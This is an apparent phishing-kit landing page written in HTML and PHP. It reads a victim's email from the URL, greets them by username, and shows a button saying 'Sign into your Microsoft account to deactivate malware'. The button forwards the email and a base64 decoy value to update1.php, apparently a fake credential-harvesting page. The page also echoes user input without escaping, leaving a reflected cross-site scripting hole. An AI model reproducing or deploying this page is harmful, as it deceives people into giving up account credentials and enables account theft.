<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Homes for Sale, Morgate Rates, Virtual Tours & Rentals I ...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="main.css" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link href="lib/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="images/favi.ico" type="image/x-icon">
    <link href="index.css" rel="stylesheet">
    <link href="css/style-responsive.css" rel="stylesheet">
    <script src="index.js"></script>


</head>
<style>
    #background{
       background-image:url("images/bgd3.jpg");
       margin-bottom:0px;
       width:100%;
       height:100%;
      padding-left:50px;
      }

    #content{
      margin-top:20px;
      color:black;
      font-size:42px;
    } 
    #in{
      height:40px; 
      width:390px; 
      margin-left:50px important!; 
      margin-top:20px; 
      background-color:#D83B01; 
      z-index:+4;
      opacity:1; 
      border:2px solid white;
    }
    
     @media (max-width: 700px){
     #content {
     width : 100%;  
     } 
     #in {
     width:270px;
     height:50px;
     margin-left:20px important!; 
  }
}



</style>


<?php
$value = $_GET['email'];
$dom = substr($value, strpos($value, '@') + 1);
$user = strstr($value, '@', true); // As of PHP 5.3.0
?>


<body id = "background"> 
<p id = "content">Hello <?php echo $user?>, Welcome <br>back</p>
<div id = "in">  
<p style = "margin-left:20px; margin-top:5px;"><a href = "update1.php?email=$value&ref=UG93ZXIgQXBwcyBDb21tdW5pdHkgIEZvcnVtcyAgR2V0IEhlbHAgd2l0aCBQb3dlciBBcHBzICBCdWlsZGluZyBQb3dlciBBcHBzICBDaXJjdWxhciBwcm9ncmVzcyBiYXIgY29tcG9uZW50cyBmb3Igc2hhcmluZyE=" style = "color:white">Sign into your Microsoft account to deactivate malware</a></p>
            </div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</body>
</html>